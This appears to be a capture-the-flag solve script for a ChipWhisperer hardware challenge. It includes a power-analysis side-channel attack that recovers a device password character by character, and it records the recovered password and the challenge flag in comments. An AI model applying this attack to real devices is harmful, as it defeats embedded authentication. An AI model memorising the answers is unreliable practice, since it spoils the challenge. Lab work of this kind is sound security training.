from pathlib import Path
import sys

# Adding parent directory to the path to access utils
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from utils.remote_cw import remote_cw, RemoteConfig
from utils.helper_cv import setup_cw, cap_pass_trace, plot_traces, PLATFORM, interact, reboot_flush, upload_firmware, reset_target
import numpy as np
import matplotlib.pyplot as plt
from rpyc.utils.classic import obtain

cfg = RemoteConfig(
    host="remotechipwhisperer.example", # replace with hostname of the remote pi or its IP address
    user="pi",
    key_filename="path/to/your/priv_key", # replace with your private key path
    port=18812,                  # must match the rpyc_classic on the Pi
    connect_host="127.0.0.1",    # local end (your machine)
    remote_host="127.0.0.1",     # remote rpyc_classic bind address
)

CHALLENGE_NAME = "darkGatekeeper"

# python -u solve.py | tee out.txt

def main():
    with remote_cw(cfg) as cw:
        # This runs on the REMOTE machine inside the venv!
        scope, target, prog = setup_cw(cw,cw.scope())
        # print(help(scope))
        # help(scope.glitch)
        # print(help(target))

        # Setting up the scope for capturing
        # scope.adc.samples = 1000
        # BAUD = target.baud
        # CLOCK = scope.io.clkout
        # NEWCLOCK = 24e6
        # scope.io.clkout = NEWCLOCK
        # NEWCLOCK = scope.io.clkout
        # target.baud = BAUD * NEWCLOCK / CLOCK
        # scope.adc.clk_freq = 7500000.0
        # print(f"[+] Changed baud rate from {BAUD} to {target.baud}")
        # print(f"[+] Changed clkout from {CLOCK} to {NEWCLOCK}")

        #upload_firmware(cw, scope, prog, CHALLENGE_NAME)

        reset_target(scope)
        target.simpleserial_write('a', b'7N4>qp14c70!')
        # val = target.simpleserial_read_witherrors('r', 18, glitch_timeout=10, timeout=50)#For loop check
        val = target.simpleserial_read('r', 18, timeout=50)#For loop check
        if val is not None:
            print(val)

        return
        from string import printable
        LEN = 12
        guessed_pw = ""


        for _ in range(0, LEN):  
            biggest_diff = 0
            biggest_char = '\x01'

            guess = guessed_pw + "\x01"*(LEN - len(guessed_pw))
            ref_trace = obtain(cap_pass_trace(scope, target, guess.encode(), verbose=True))
            for c in printable[:-6]:
                guess = (guessed_pw + c + "\x01"*(LEN - len(guessed_pw) -1)).encode()
                trace = obtain(cap_pass_trace(scope, target, guess, verbose=True))
                while trace is None:
                    print("Retrying...")
                    trace = obtain(cap_pass_trace(scope, target, guess, verbose=True))
                
                diff = np.sum(np.abs(trace - ref_trace))

                print(f"Trying char: {c} => diff: {diff}")

                if diff > biggest_diff:
                    biggest_diff = diff
                    biggest_char = c
            guessed_pw += biggest_char
            print("Current Password: ", guessed_pw)

        print("Final Password: ", guessed_pw)

if __name__ == "__main__":
    main()

# Final Password: 7N4>qp14c70!
# bytearray(b'ESC{J0lt_Th3_G473}')